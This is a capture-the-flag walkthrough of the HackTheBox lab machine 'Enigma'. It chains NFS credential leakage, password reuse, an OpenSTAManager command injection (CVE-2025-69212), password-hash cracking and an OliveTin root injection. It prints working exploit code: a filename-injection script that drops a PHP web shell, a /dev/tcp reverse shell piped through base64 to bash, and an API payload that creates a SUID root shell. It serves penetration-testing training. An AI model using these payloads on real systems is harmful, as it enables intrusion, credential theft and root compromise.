# (Season 11) "Enigma" HackTheBox — Professional Walkthrough

**Summary:** Enigma is a highly vulnerable machine that relies on a series of common
configuration errors. The initial foothold comes from sensitive credentials exposed via an
NFS share. Password reuse and email access eventually lead to compromised OpenSTAManager
(CRM) administrative credentials, which are exploited via a command-injection vulnerability
to gain a foothold as `www-data`. Lateral movement to the user `haris` follows, and root is
obtained by injecting commands into a misconfigured OliveTin automation tool that runs as root.

---

## 1. Recon and External Enumeration

Target: `10.129.239.191`

Start with a full service/version scan:

```bash
nmap -sV -sC mail001.enigma.htb
```

**Key results:**

| Port | Service | Details |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 |
| 80/tcp | http | nginx 1.24.0 (Ubuntu) — Roundcube Webmail, title: "Welcome to Roundcube Webmail" |
| 110/tcp | pop3 | Dovecot pop3d |
| 111/tcp | rpcbind | RPC #100000, exposes NFS/mountd (v3,4) |

The rpcbind/NFS services on port 111/2049 stand out as an enumeration target.

---

## 2. Initial Foothold: Credential Leak via NFS

Enumerate NFS exports:

```bash
showmount -e 10.129.239.191
# Export list for 10.129.239.191:
# /nfs/onboarding *
```

Mount the share and inspect its contents:

```bash
mkdir -p /tmp/onboarding
sudo mount -t nfs 10.129.239.191:/nfs/onboarding /tmp/onboarding
ls -la /tmp/onboarding
# -rw-r--r-- 1 root root 1575 Feb 14 19:53 New_Employee_Access.pdf
```

Convert the PDF to text to extract its contents:

```bash
pdftotext New_Employee_Access.pdf New_Employee_Access.txt
cat New_Employee_Access.txt
```

**Extracted credentials (Enigma Corp — IT Department, New Employee System Access):**

- **Employee:** Kevin Mitchell
- **URL:** `http://mail001.enigma.htb`
- **Username:** `kevin`
- **Password:** `Enigma2024!`

Logging in to the Roundcube webmail application at `http://mail001.enigma.htb` succeeds with
these credentials.

---

## 3. Lateral Movement: Password Reuse (Sarah)

Inside Kevin's mailbox is a company-wide password policy showing that new employees are
issued the same default temporary password. Trying `Enigma2024!` against another employee
account, **Sarah**, also succeeds.

Inside Sarah's inbox is an email titled **"Re: OpenSTAManager Access Request"**, sent from
`it@enigma.htb`, containing administrative credentials for a different subdomain:

```
URL:      http://support_001.enigma.htb
Username: admin
Password: Ne3s4rTars78s
```

Add the new subdomain to the local hosts file:

```bash
echo '10.129.239.191 support_001.enigma.htb' | sudo tee -a /etc/hosts
```

---

## 4. Exploiting OpenSTAManager (CVE-2025-69212)

Navigating to `http://support_001.enigma.htb` reveals the OpenSTAManager CRM application.
Login succeeds with `admin:Ne3s4rTars78s`.

**Vulnerability:** This version of OpenSTAManager is vulnerable to OS command injection
during the signature-verification handling of uploaded `.p7m` files (CVE-2025-69212). When a
user uploads a file to verify its signature, the application calls `exec()` on an OpenSSL
binary using an attacker-controlled filename.

**Exploit strategy:** Craft a malicious `.zip` archive containing a `.p7m` file whose filename
is designed to break out of the shell command context and execute arbitrary OS commands.

`exploit.py`:

```python
import zipfile

cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

Upload `exploit.zip` via the **"Importazione FE" (Import XML)** feature in the web
application. The application shows an XML parsing error, but the command injection executes
successfully in the background, dropping a PHP web shell.

Confirm the web shell:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Establish a reverse shell:**

```bash
# Generate a base64-encoded reverse shell payload
echo -n 'bash -i >& /dev/tcp/10.10.14.51/4444 0>&1' | base64 -w0

curl -G "http://support_001.enigma.htb/files/SHELL.php" \
  --data-urlencode 'c=echo <base64_payload> | base64 -d | bash'
```

Catch it with a listener:

```bash
nc -lvnp 4444
# Connection received on 10.129.239.191
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 5. Internal Pivoting and the User Flag

As `www-data`, inspect the OpenSTAManager web root for its configuration file:

```bash
cat /var/www/html/openstamanager/config.inc.php
```

This leaks MySQL database credentials:

```
$db_username = 'brollin'
$db_password = 'Fri3nds@999'
$db_name     = 'openstamanager'
```

Use these credentials to enumerate application user accounts and password hashes:

```bash
mysql -u brollin -p'Fri3nds@999' -h localhost openstamanager \
  -e "SELECT username, password FROM zz_users;"
```

**Hashes found:**

```
admin: $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
haris: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZe0YXm0biNphrsZDr6ec
```

Crack the `haris` hash with John the Ripper and the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt harris-hash
```

Password cracked: **`bestfriends`**

Switch to the `haris` system user:

```bash
su haris
# Password: bestfriends
```

Read the user flag:

```bash
cat /home/haris/user.txt
```

---

## 6. Privilege Escalation to Root via OliveTin

Enumerating processes as `haris` reveals a service running as root:

```bash
ps aux | grep root
# root  1440  ...  /usr/local/bin/oliveTin
```

**Configuration analysis:** Inspect OliveTin's configuration at
`/opt/OliveTin/OliveTin-linux-amd64/config.yaml`.

Key findings:

- `authRequireGuestsToLogin: false` — the local API is unauthenticated/unrestricted for local users.
- A custom action named **`database_backup`** runs the following shell command template:

```
mysqldump -u {{db_user}} -p\"{{db_pass}}\" {{db_name}} > /opt/backups
```

with parameters:

```
db_user  (type: ascii_identifier)
db_pass  (type: password / free text)
db_name  (type: ascii_identifier)
```

**The vulnerability:** The `db_pass` parameter is injected directly into the shell command
inside double quotes. Because `db_pass` isn't restricted the way `db_user`/`db_name` are
(`ascii_identifier`), a value can close the preceding double quote (`"`) and inject arbitrary
shell commands, then comment out the remainder of the original command with `#` to avoid a
syntax error.

**Exploit — call the internal OliveTin API directly:**

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"actionId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"x\" ; install -m 4755 /bin/bash /tmp/bs ; #"},{"name":"db_name","value":"production"}]}' \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction
```

This copies `/bin/bash` to `/tmp/bs` with the SUID bit set and owned as root
(`install -m 4755`), giving a setuid root shell binary.

**Get root:**

```bash
/tmp/bs -p whoami
# root

cat /root/root.txt
```

---

## Attack Chain Summary

1. **Recon** — nmap reveals SSH, Roundcube webmail, and exposed NFS/rpcbind services.
2. **NFS foothold** — anonymous mount of `/nfs/onboarding` leaks a PDF with Kevin's Roundcube credentials.
3. **Credential reuse** — the same temporary password grants access to Sarah's mailbox, which contains admin credentials for an internal CRM subdomain (OpenSTAManager).
4. **RCE (CVE-2025-69212)** — a crafted `.p7m` filename injected into an OpenSSL `exec()` call yields a web shell as `www-data`.
5. **Lateral movement** — a leaked MySQL config exposes app user password hashes; cracking `haris`'s hash grants SSH/system-level access and the user flag.
6. **Privilege escalation** — an unauthenticated OliveTin API with an unsanitized `db_pass` parameter allows command injection into a root-owned automation task, enabling a SUID-root shell and the root flag.
